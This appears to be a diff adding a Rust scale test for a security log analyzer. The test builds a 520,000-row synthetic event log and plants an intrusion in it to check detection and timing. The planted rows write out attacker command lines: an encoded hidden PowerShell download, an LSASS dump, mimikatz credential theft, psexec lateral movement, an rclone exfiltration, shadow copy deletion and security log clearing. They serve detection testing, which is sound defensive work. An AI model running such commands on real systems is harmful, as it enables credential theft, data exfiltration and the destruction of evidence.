@@ -340,3 +340,245 @@ fn analyst_front_door_answers_whats_in_this_file() {
         db_path.display()
     );
 }
+
+/// 520k-row scale proof for the v0.2.2 "parse it row by row" flow: generates (once, then
+/// cached on disk) a Sentinel-style 520,000-row XLSX — benign multi-log-type noise plus one
+/// planted multi-tactic intrusion inside a 45-minute window on one host — then drives the
+/// real pipeline end to end: XLSX import → analyst front-door ask (roles, UTC, MITRE scan +
+/// chains, anomaly scan, per-row activity classification) → full report export including the
+/// 520k-row "Row by Row" sheet. Prints per-phase wall times and asserts generous ceilings so
+/// a hang or pathological slowdown fails loudly instead of freezing the app for the examiner.
+///
+///   cargo test --release --test agent_sentinel_e2e analyst_scale_520k -- --ignored --nocapture
+#[test]
+#[ignore]
+fn analyst_scale_520k_rows() {
+    use log_parser_lib::intel::analyst;
+    use rust_xlsxwriter::Workbook;
+
+    const TOTAL_ROWS: usize = 520_000;
+    let dir = Path::new(env!("CARGO_MANIFEST_DIR"))
+        .join("..")
+        .join(".dev")
+        .join("scale-520k");
+    std::fs::create_dir_all(&dir).unwrap();
+    let xlsx = dir.join("sentinel_scale_520k.xlsx");
+
+    // ---- 0. fixture generation (cached across runs) -----------------------------
+    if !xlsx.exists() {
+        let t = Instant::now();
+        let headers = [
+            "TimeGenerated",
+            "Computer",
+            "Account",
+            "EventID",
+            "Activity",
+            "ProcessName",
+            "CommandLine",
+            "SourceIP",
+            "FileName",
+            "LogonType",
+        ];
+        let mut workbook = Workbook::new();
+        let sheet = workbook.add_worksheet_with_constant_memory();
+        for (col, header) in headers.iter().enumerate() {
+            sheet.write_string(0, col as u16, *header).unwrap();
+        }
+
+        // The intrusion: 12 events, one host, one identity, 02:00-02:45 UTC (off-hours),
+        // spanning enough tactics to chain.
+        let intrusion: [(&str, &str, i64, &str, &str, &str); 12] = [
+            ("2026-06-10T02:01:10Z", "4624", 3, "An account was successfully logged on", "", ""),
+            ("2026-06-10T02:03:22Z", "4688", 0, "A new process has been created", "powershell.exe", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQA"),
+            ("2026-06-10T02:05:41Z", "4688", 0, "A new process has been created", "whoami.exe", "whoami /all"),
+            ("2026-06-10T02:07:02Z", "4688", 0, "A new process has been created", "nltest.exe", "nltest /domain_trusts"),
+            ("2026-06-10T02:11:33Z", "4688", 0, "A new process has been created", "procdump.exe", "procdump.exe -ma lsass.exe C:\\Users\\Public\\l.dmp"),
+            ("2026-06-10T02:15:09Z", "4688", 0, "A new process has been created", "mimikatz.exe", "mimikatz.exe sekurlsa::logonpasswords"),
+            ("2026-06-10T02:19:47Z", "4688", 0, "A new process has been created", "psexec.exe", "psexec.exe \\\\FS-SCALE-02 -u CORP\\svc_backup cmd.exe"),
+            ("2026-06-10T02:24:12Z", "4688", 0, "A new process has been created", "7z.exe", "7z.exe a -pinfected C:\\Users\\Public\\stage.7z C:\\Finance\\*"),
+            ("2026-06-10T02:29:55Z", "4688", 0, "A new process has been created", "rclone.exe", "rclone.exe copy C:\\Users\\Public\\stage.7z remote:drop"),
+            ("2026-06-10T02:34:18Z", "4688", 0, "A new process has been created", "vssadmin.exe", "vssadmin delete shadows /all /quiet"),
+            ("2026-06-10T02:38:30Z", "4688", 0, "A new process has been created", "wevtutil.exe", "wevtutil.exe cl Security"),
+            ("2026-06-10T02:41:03Z", "4634", 3, "An account was logged off", "", ""),
+        ];
+
+        let benign_users = 40usize;
+        let benign_hosts = 60usize;
+        let benign_commands = [
+            "cmd.exe /c dir C:\\Reports",
+            "notepad.exe C:\\notes\\meeting.txt",
+            "explorer.exe",
+            "outlook.exe",
+            "chrome.exe --profile-directory=Default",
+            "svchost.exe -k netsvcs",
+        ];
+        // 12 intrusion rows scattered deterministically through the noise, everything in
+        // ascending time order like a real export: noise covers 22 business days.
+        let mut intrusion_iter = intrusion.iter();
+        let mut next_intrusion = intrusion_iter.next();
+        let mut excel_row = 1u32;
+        for i in 0..TOTAL_ROWS - intrusion.len() {
+            let day = 1 + (i * 22 / (TOTAL_ROWS - intrusion.len()));
+            // Insert the whole intrusion between day 9 noise and day 10 noise.
+            while day >= 10 && next_intrusion.is_some() {
+                let (ts, event_id, logon_type, activity, process, cmd) = next_intrusion.unwrap();
+                sheet.write_string(excel_row, 0, *ts).unwrap();
+                sheet.write_string(excel_row, 1, "WS-SCALE-13").unwrap();
+                sheet.write_string(excel_row, 2, "CORP\\eviluser").unwrap();
+                sheet.write_string(excel_row, 3, *event_id).unwrap();
+                sheet.write_string(excel_row, 4, *activity).unwrap();
+                sheet.write_string(excel_row, 5, *process).unwrap();
+                sheet.write_string(excel_row, 6, *cmd).unwrap();
+                sheet.write_string(excel_row, 7, "10.10.9.13").unwrap();
+                sheet.write_string(excel_row, 8, "").unwrap();
+                sheet
+                    .write_string(excel_row, 9, &logon_type.to_string())
+                    .unwrap();
+                excel_row += 1;
+                next_intrusion = intrusion_iter.next();
+            }
+            let hour = 8 + (i % 10);
+            let minute = i % 60;
+            let second = (i * 7) % 60;
+            let ts = format!("2026-06-{:02}T{:02}:{:02}:{:02}Z", day.min(30), hour, minute, second);
+            let user = format!("CORP\\user{:03}", i % benign_users);
+            let host = format!("WS-SCALE-{:02}", i % benign_hosts);
+            // Rotate log types: authentication, process, file share, network, logoff.
+            let (event_id, activity, process, cmd, file): (&str, &str, &str, String, String) =
+                match i % 5 {
+                    0 => ("4624", "An account was successfully logged on", "", String::new(), String::new()),
+                    1 => (
+                        "4688",
+                        "A new process has been created",
+                        "cmd.exe",
+                        benign_commands[i % benign_commands.len()].to_string(),
+                        String::new(),
+                    ),
+                    2 => (
+                        "5140",
+                        "A network share object was accessed",
+                        "",
+                        String::new(),
+                        format!("\\\\FS-SCALE-01\\dept\\doc{}.docx", i % 900),
+                    ),
+                    3 => ("5156", "The Windows Filtering Platform has permitted a connection", "", String::new(), String::new()),
+                    _ => ("4634", "An account was logged off", "", String::new(), String::new()),
+                };
+            sheet.write_string(excel_row, 0, &ts).unwrap();
+            sheet.write_string(excel_row, 1, &host).unwrap();
+            sheet.write_string(excel_row, 2, &user).unwrap();
+            sheet.write_string(excel_row, 3, event_id).unwrap();
+            sheet.write_string(excel_row, 4, activity).unwrap();
+            sheet.write_string(excel_row, 5, process).unwrap();
+            sheet.write_string(excel_row, 6, &cmd).unwrap();
+            sheet
+                .write_string(excel_row, 7, &format!("10.10.{}.{}", i % 20, i % 250))
+                .unwrap();
+            sheet.write_string(excel_row, 8, &file).unwrap();
+            sheet.write_string(excel_row, 9, "3").unwrap();
+            excel_row += 1;
+        }
+        assert_eq!(excel_row as usize, TOTAL_ROWS + 1, "fixture must have exactly 520k data rows");
+        workbook.save(&xlsx).unwrap();
+        println!("=== FIXTURE generated {} rows in {:?} ({} bytes) ===",
+            TOTAL_ROWS, t.elapsed(), std::fs::metadata(&xlsx).unwrap().len());
+    } else {
+        println!("=== FIXTURE cached: {} ===", xlsx.display());
+    }
+
+    // ---- 1. import (real XLSX path) ---------------------------------------------
+    let db_path = dir.join("scale_520k.sqlite3");
+    let _ = std::fs::remove_file(&db_path);
+    let t = Instant::now();
+    tabular_import::import_into_db(&xlsx, "Sheet1", &db_path, |_, _| {}).unwrap();
+    let import_time = t.elapsed();
+    let mut conn = db::open(&db_path).unwrap();
+    let columns = db::load_columns(&conn).unwrap();
+    let row_count: i64 = conn
+        .query_row("SELECT COUNT(*) FROM rows", [], |r| r.get(0))
+        .unwrap();
+    println!("\n=== IMPORT: {} rows, {} columns in {:?} ===", row_count, columns.len(), import_time);
+    assert_eq!(row_count, TOTAL_ROWS as i64);
+    assert!(
+        import_time.as_secs() < 180,
+        "520k import took {import_time:?} — should be well under 3 minutes in release"
+    );
+
+    // ---- 2. the user's exact flow: one ask, zero setup --------------------------
+    let t = Instant::now();
+    let answer = analyst::ask(
+        &mut conn,
+        &columns,
+        "parse this xls and find me row by row what activity is there",
+        |phase| println!("  [analyst phase] {phase} at {:?}", t.elapsed()),
+    )
+    .unwrap();
+    let ask_time = t.elapsed();
+    println!("\n=== ANALYST ANSWER in {ask_time:?} ===");
+    println!("intent: {}", answer.intent);
+    println!("headline: {}", answer.headline);
+    for step in &answer.steps {
+        println!("  step {:<14} {:<8} {}", step.step, step.status, step.detail);
+    }
+    for section in &answer.sections {
+        println!("\n[{}]", section.heading);
+        for line in &section.lines {
+            println!("  {}", line.text);
+        }
+    }
+    assert_eq!(answer.intent, "profile");
+    for step_name in ["data_mapping", "timeline", "mitre_scan", "anomaly_scan", "activity"] {
+        let status = answer
+            .steps
+            .iter()
+            .find(|step| step.step == step_name)
+            .map(|step| step.status.as_str())
+            .unwrap_or("missing");
+        assert_eq!(status, "ran", "step {step_name} did not run at 520k scale");
+    }
+    assert!(
+        ask_time.as_secs() < 600,
+        "analyst ask took {ask_time:?} at 520k rows — the app would feel stuck"
+    );
+
+    // Every row classified; the planted intrusion found and chained on the right host.
+    let activity = answer.activity.as_ref().expect("activity summary");
+    assert_eq!(activity.rows_classified, TOTAL_ROWS as i64);
+    assert!(
+        activity.categories.len() >= 4,
+        "expected several activity types, got {:?}",
+        activity.categories.iter().map(|c| &c.category).collect::<Vec<_>>()
+    );
+    let scan = answer.scan.as_ref().expect("scan summary");
+    assert!(scan.match_count > 0, "curated scan found nothing at 520k");
+    assert!(!scan.chains.is_empty(), "planted intrusion did not chain");
+    assert_eq!(
+        scan.chains[0].host.as_deref(),
+        Some("WS-SCALE-13"),
+        "top chain should be the planted host"
+    );
+    let anomalies = answer.anomalies.as_ref().expect("anomaly summary");
+    assert!(anomalies.flagged_rows > 0);
+
+    // ---- 3. full report incl. the 520k-row Row by Row sheet ----------------------
+    let report_path = dir.join("report_scale_520k.xlsx");
+    let _ = std::fs::remove_file(&report_path);
+    let t = Instant::now();
+    let summary = report::export_report(&mut conn, &columns, &report_path, |_, _| {}).unwrap();
+    let report_time = t.elapsed();
+    println!("\n=== REPORT in {report_time:?}: sheets={:?} ({} bytes) ===",
+        summary.sheets_written,
+        std::fs::metadata(&report_path).unwrap().len());
+    assert!(summary.sheets_written.iter().any(|s| s == "Activity Summary"));
+    assert_eq!(summary.sheets_written.last().map(String::as_str), Some("Row by Row"));
+    assert!(
+        report_time.as_secs() < 600,
+        "report export took {report_time:?} at 520k rows — the app would feel stuck"
+    );
+
+    println!(
+        "\n=== SCALE PROOF DONE. import={import_time:?} ask={ask_time:?} report={report_time:?} ===\nArtifacts: {} , {}",
+        report_path.display(),
+        db_path.display()
+    );
+}
